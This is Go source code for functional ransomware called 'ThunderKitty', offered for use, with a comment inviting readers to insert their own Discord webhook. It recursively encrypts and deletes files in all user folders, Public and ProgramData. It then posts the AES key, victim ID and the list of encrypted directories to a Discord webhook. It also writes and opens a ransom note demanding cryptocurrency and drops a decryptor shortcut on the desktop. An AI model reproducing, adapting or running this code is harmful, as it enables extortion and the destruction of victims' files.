package main

import (
	_ "embed"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"time"
)

go:embed decrypt.exe
var decryptExeBytes []byte

const (
	dischook    = "https://discord.com/api/webhooks/1424845394390548500/40sLvyiGQvKhUg1TELDOLN99vOLe-VwntoyAGFm4gJi-BVxft1OjVzFtDiuLQJSSZOaq" // REPLACE YOUR DISCORD WEBHOOK HERE LOL
	userIDChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	xmraddr     = "bc1q336c9n2tngzl2uk8wfdvr4k0hnf9k6allms7ve"
	cashamt     = "100"
	email       = "emailforransoms@proton.me"
)

var (
	userID        string
	key           []byte
	encryptedDirs []string
)

var systemUsers = map[string]bool{
	"Default":      true,
	"Default User": true,
	"Public":       true,
	"All Users":    true,
	"desktop.ini":  true,
}

func main() {
	userID = genuserid(9)
	key = make([]byte, 32)
	rand.Read(key)

	encryptedDirs = []string{}

	encryptAllUsersAndProgramData()

	sendHook()
	note()

	decryptPath, err := writeDecryptor()
	if err != nil {
		fmt.Println("Failed to write decryptor:", err)
	} else {
		fmt.Println("Decryptor written to:", decryptPath)
	}

	err = createDecryptShortcut(decryptPath)
	if err != nil {
		fmt.Println("Failed to create decrypt shortcut:", err)
	} else {
		fmt.Println("Decrypt shortcut created on desktop")
	}
}

func genuserid(length int) string {
	var res strings.Builder
	chartst := userIDChars
	for i := 0; i < length; i++ {
		randinx := rndint(len(chartst))
		res.WriteByte(chartst[randinx])
	}
	return res.String()
}

func encryptAllUsersAndProgramData() {
	usersPath := "C:\\Users"
	entries, err := ioutil.ReadDir(usersPath)
	if err != nil {
		return
	}
	targetFolders := []string{"Documents", "Desktop", "Downloads", "Pictures", "Videos", "Music", "OneDrive"}

	for _, entry := range entries {
		if entry.IsDir() && !isSystemUser(entry.Name()) {
			userDir := filepath.Join(usersPath, entry.Name())
			for _, folder := range targetFolders {
				fullPath := filepath.Join(userDir, folder)
				if dirExists(fullPath) {
					encryptdir(fullPath)
					encryptedDirs = append(encryptedDirs, fullPath)
				}
			}
		}
	}

	publicPath := "C:\\Users\\Public"
	if dirExists(publicPath) {
		encryptdir(publicPath)
		encryptedDirs = append(encryptedDirs, publicPath)
	}

	programDataPath := "C:\\ProgramData"
	if dirExists(programDataPath) {
		encryptdir(programDataPath)
		encryptedDirs = append(encryptedDirs, programDataPath)
	}
}

func isSystemUser(name string) bool {
	_, exists := systemUsers[name]
	return exists
}

func dirExists(path string) bool {
	info, err := os.Stat(path)
	if err != nil {
		return false
	}
	return info.IsDir()
}

func encryptdir(directory string) {
	files, err := ioutil.ReadDir(directory)
	if err != nil {
		return
	}
	for _, file := range files {
		filePath := filepath.Join(directory, file.Name())
		if file.IsDir() {
			encryptdir(filePath)
			continue
		}
		crypt(filePath)
	}
}

func crypt(filePath string) {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return
	}
	block, _ := aes.NewCipher(key)
	aesgcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, aesgcm.NonceSize())
	rand.Read(nonce)
	ciphertext := aesgcm.Seal(nil, nonce, data, nil)
	encryptedData := append(nonce, ciphertext...)
	_ = os.WriteFile(filePath+".thunderkitty.encrypted", encryptedData, 0644)
	_ = os.Remove(filePath)
}

func rndint(max int) int {
	b := make([]byte, 1)
	rand.Read(b)
	return int(b[0]) % max
}

func sendHook() {
	encDirsStr := strings.Join(encryptedDirs, "\n")

	payload := map[string]interface{}{
		"username":   "ThunderKitty Ransm",
		"avatar_url": "https://raw.githubusercontent.com/Evilbytecode/ThunderKitty-Ransomware/main/assests/LogoRansom.png",
		"embeds": []map[string]interface{}{
			{
				"title":       "ThunderKitty - Ransm Hit",
				"description": "Hello, when someone pays send them decryption file.",
				"url":         "https://github.com/Evilbytecode",
				"color":       0x800080,
				"thumbnail": map[string]interface{}{
					"url": "https://raw.githubusercontent.com/Evilbytecode/ThunderKitty-Ransomware/main/assests/LogoRansom.png",
				},
				"fields": []map[string]interface{}{
					{"name": "User ID", "value": fmt.Sprintf("`%s`", userID), "inline": true},
					{"name": "Encrypted Dirs", "value": fmt.Sprintf("```\n%s\n```", encDirsStr), "inline": false},
					{"name": "Key", "value": fmt.Sprintf("`%s`", hex.EncodeToString(key)), "inline": true},
				},
				"footer":    map[string]interface{}{"text": "https://github.com/Evilbytecode"},
				"timestamp": time.Now().Format(time.RFC3339),
			},
		},
	}

	plBytes, _ := json.Marshal(payload)
	_, _ = http.Post(dischook, "application/json", bytes.NewReader(plBytes))
}

func note() {
	curusr, _ := user.Current()
	dskpth := filepath.Join(curusr.HomeDir, "Desktop")
	ntpath := filepath.Join(dskpth, "ThunderKitty-Note.txt")

	encDirsStr := strings.Join(encryptedDirs, "\n")

	msg := fmt.Sprintf(`
Your computer is now infected with ransomware. Your files are encrypted with a secure algorithm that is impossible to crack.
To recover your files you need a key. This key is generated once your files have been encrypted. To obtain the key, you must purchase it.

You can do this by sending %s USD via Monero to this Bitcoin address:
%s

Don't know how to get Monero? Here are some websites:

https://www.kraken.com/en-gb/learn/buy-crypto
https://www.okx.com/buy-xmr

Do not remove this info, or you won't be able to get your files back.
User ID: %s

Encrypted directories:
%s

When you purchase, contact us at %s.

Once you have completed all of the steps, you will be provided with the key to decrypt your files.
Good luck.

	`, cashamt, xmraddr, userID, encDirsStr, email)

	_ = os.WriteFile(ntpath, []byte(strings.TrimSpace(msg)), 0644)
	_ = exec.Command("cmd", "/c", "start", ntpath).Start()
}

func writeDecryptor() (string, error) {
	curusr, err := user.Current()
	if err != nil {
		return "", err
	}
	targetDir := filepath.Join(curusr.HomeDir, "AppData", "Local", "ThunderKitty")
	err = os.MkdirAll(targetDir, 0755)
	if err != nil {
		return "", err
	}
	targetPath := filepath.Join(targetDir, "decrypt.exe")

	err = os.WriteFile(targetPath, decryptExeBytes, 0755)
	if err != nil {
		return "", err
	}
	return targetPath, nil
}

func createDecryptShortcut(decryptPath string) error {
	curusr, err := user.Current()
	if err != nil {
		return err
	}
	desktopPath := filepath.Join(curusr.HomeDir, "Desktop")
	batchPath := filepath.Join(desktopPath, "ThunderKitty Decrypt.bat")

	batchContent := fmt.Sprintf(`@echo off
"%s"
pause
`, decryptPath)

	return os.WriteFile(batchPath, []byte(batchContent), 0644)

}
